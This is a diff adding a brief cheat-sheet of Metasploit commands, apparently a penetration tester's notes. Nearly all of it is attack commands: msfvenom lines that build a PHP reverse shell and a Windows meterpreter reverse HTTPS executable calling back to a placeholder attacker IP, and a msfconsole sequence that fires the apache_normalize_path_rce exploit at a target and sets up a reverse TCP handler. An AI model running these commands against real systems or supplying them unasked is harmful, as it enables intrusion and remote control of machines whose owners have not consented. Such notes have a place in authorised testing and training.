@@ -1,0 +1,27 @@
+steps.Metasploit
+
+
+Building shells 
+
+revshells.com
+
+Examples
+    msfvenom -p php/reverse_php LHOST=<attackerIP> LPORT=444 -f raw > shell.pHp
+
+    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<attackerIP> LPORT=443 -f exe -o met.exe
+
+
+Example sploit run
+
+    use multi/http/apache_normalize_path_rce
+    options
+
+    set LHOST <attackerIP>;
+    set RPORT 80;
+    set SSL false;
+    set RHOST <target>;
+    use multi/handler
+    set payload windows/x64/shell/reverse_tcp
+    set LPORT 4443;
+    set LHOST <attackerIP> 
+    run
